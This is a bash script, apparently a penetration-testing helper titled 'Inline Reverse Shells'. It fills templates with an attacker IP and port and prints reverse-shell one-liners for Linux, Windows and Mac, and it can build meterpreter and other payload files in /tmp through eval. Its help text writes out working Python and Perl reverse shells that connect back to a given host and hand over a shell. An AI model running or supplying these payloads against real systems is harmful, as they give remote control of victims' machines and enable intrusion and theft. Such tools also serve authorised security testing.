#!/bin/bash
title="Inline Reverse Shells"
description="Provides Greppable-Cuttable one liners with one keystroke!"
version="0.1 alpha"

default_shell="/bin/sh"
default_port="4444"
default_ip=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/')	# dirty way to get a current IP
default_plat="lin"
quiet=0
filemake=0
variabled=0
readable=0
del_s="#"

scr_name=`basename "$0"`
#scr_name="${0}"
#scr_name="oneliner"
echo $scr_name

inv_style="\e[7m"
rst_style="\e[0m"
b_u_style="\e[1;4m"
yel_style="\e[33m"

help_str="Usage:\n
	\tin_shell.sh [-i IP] [-p PORT] [-A PLATFORM] [-s SHELL_TYPE] [-d DELIM] [-qfr] \n\n

option	:	description		-	Default\n\n
-i	:	The IP that the reverse shell will connect to.	-	$default_ip	(an 'ip addr' IP except localhost)\n
-p	:	The TCP port that the reverse shell will connect to.	-	$default_port\n
-A	:	[lin|win|mac]	The OS that the reverse shell command will run on.	-	$default_plat\n
-s	:	[cmd.exe|/bin/sh| etc]	The shell you are claiming. Quote for shell arguments (-s \"/bin/bash -i\")	-	$default_shell\n
-q	:	Quiet mode. Doesn't show the instructions, just the stuff (USE IT).	-	Disabled\n
-f	:	Create standalone files at /tmp (meterpreter, python rev_shell, etc)	- Disabled (makes the script slow)\n
-d	:	[#|@| etc] Set 'cut' delimiter. It MUST be one char for use with UNIX cut	-	$del_s\n
-r	:	Makes the output Readable for humans	-	Disabled\n
-h	:	This help message		\n
\n\n
Example :\n
	\tin_shell.sh -i 192.168.1.2 -p 444 -A win -s cmd.exe -d# -q -f -r
"

example1="$scr_name -i 192.168.1.2 -p 444 -A lin -s /bin/sh -q | grep python | cut -d# -f4"
example2="$scr_name -i 192.168.1.2 -p 444 -A win -q -f | grep meterpreter | cut -d# -f4"
example3="$scr_name -A win -i 4| grep powershell| cut -d# -f1,4 "
example4="$scr_name -A win -i 4| grep powershell| cut -d# -f1,4- "
example5="$scr_name -A win | grep perl |cut -d# -f4"

#echo $(basename $(readlink -nf $0))
#ex1_eval=$(eval bash $example1)
#echo $ex1_eval
#exit

instructions="\n
==============================================================================\n
Instructions\n
Pipe this command with 'grep' and 'cut' to get reverse shell one-liners and payload file locations.\n
Example:\n
	\t$b_u_style To get all python reverse shell one-liner for linux /bin/sh shell type: $rst_style\n
	$ $scr_name -i 192.168.1.2 -p 444 -A lin -s /bin/sh -q | grep python | cut -d# -f4\n
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.2\",444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\"]);'\n\n
	\n
	\t$b_u_style To get a meterpreter reverse TCP executable for windows type (it is a file so enable -f): $rst_style\n
	$ $scr_name -i 192.168.1.2 -p 444 -A win -q -f | grep meterpreter | cut -d# -f4 \n
	/tmp/meterpreter\n\n

	\t$b_u_style To get all powershell reverse shell one-liners numbered type: $rst_style\n
	$ $scr_name -A win -i 4| grep powershell| cut -d# -f1,4- \n
	[ ...output trimmed... try it yourself! ] \n
	\n

	\t$b_u_style Defaults are also sane$rst_style:\n
	$ $scr_name -A win | grep perl |cut -d# -f4\n
	perl -MIO::Socket -e '\$c=new IO::Socket::INET(PeerAddr => \"$default_ip:$default_port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'\n\n
\n
==============================================================================
\n
\t\t***Happy Hunting***
\n
"

intro(){

	echo $title
	echo $description
	echo "version: $version"

}

clear

ip=$default_ip
port=$default_port
shell=$default_shell
plat=$default_plat


while getopts "i:p:A:s:d:hqfr" arg; do
	case $arg in
		i)	ip=$OPTARG;;
		p)	port=$OPTARG;;
		A)	plat=$OPTARG;;
		s)	shell=$OPTARG;;
		d)	del_s=$OPTARG;;
		h)	echo -e $help_str ;	echo -e $instructions ;exit;;
		q)	quiet=1;;
		f)	filemake=1;;
		r)	readable=1;;
	esac
done


if [ "$quiet" = "0" ]; then
	intro
	echo 
fi

if [ "$plat" = "win" ]; then
        shell="cmd.exe"
fi


ip_tok="-IP-"
port_tok="-PORT-"
shell_tok="-SHELL-"
file_tok="-FILE-"

shell_var="\$x"
py_var="sys.argv[x]"
rb_var="ARGV[x]"	# add +1 here
pl_var="\$ARGV[x]"	# add +1 here

DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
s_folder="$DIR/templates/"
f_folder="$DIR/files/"

scripts=$(ls $s_folder | grep $plat)
files=$(ls $f_folder | grep $plat)

del_s="#"
shell_s="shell"
file_s="file"
inl_s="inline"

if [ "$readable" = "1" ]; then
	echo "Readable Output:"
	echo
	echo "		-Reverse Shells-"
	echo

	i=1
	for s_file in $scripts; do
		scr=$(cat "$s_folder$s_file")
		typ=$(echo $s_file | cut -d. -f1)
		scr=$(echo $scr | sed -e "s#$ip_tok#$ip#g" -e "s#$port_tok#$port#g" -e "s#$shell_tok#$shell#g")
		echo "================================================="
		echo "$i.	$typ:"
		echo
		echo -e "$b_u_style$yel_style$scr$rst_style"
		echo
		echo "================================================="
		i=$(expr $i + 1)
	done

else


	i=0
	for s_file in $scripts; do
		scr=$(cat "$s_folder$s_file")
		typ=$(echo $s_file | cut -d. -f1)

		scr=$(echo $scr | sed -e "s#$ip_tok#$ip#g" -e "s#$port_tok#$port#g" -e "s#$shell_tok#$shell#g")
		echo -e $i$del_s$shell_s$del_s$typ$del_s$yel_style$scr$rst_style$del_s

		i=$(expr $i + 1)
	done

fi

if [ "$filemake" = "1" ]; then
	for f_file in $files; do
		fil=$(cat "$f_folder$f_file")
		typ=$(echo $f_file | cut -d. -f1)
		name="/tmp/$typ"
		comm=$(echo $fil | sed -e "s#$ip_tok#$ip#g" -e "s#$port_tok#$port#g" -e "s#$file_tok#$name#g")

#		echo $comm
		eval "$comm 1>/dev/null 2>&1"
		echo $i$del_s$file_s$del_s$typ$del_s$name

		i=$(expr $i + 1)
	done
fi
